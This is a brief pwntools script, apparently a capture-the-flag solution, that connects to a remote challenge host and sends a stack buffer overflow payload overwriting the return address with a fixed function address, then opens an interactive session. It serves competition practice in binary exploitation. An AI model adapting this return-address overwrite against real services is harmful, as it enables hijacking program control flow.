#!/usr/local/bin/python3

from pwn import *

flag_addr = 0x401236

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']
r = remote("challs.actf.co", 31224)

r.recvuntil("Cry: ")
payload = b'A' * (0x20 + 8) + p64(flag_addr)
r.sendline(payload)

r.interactive()
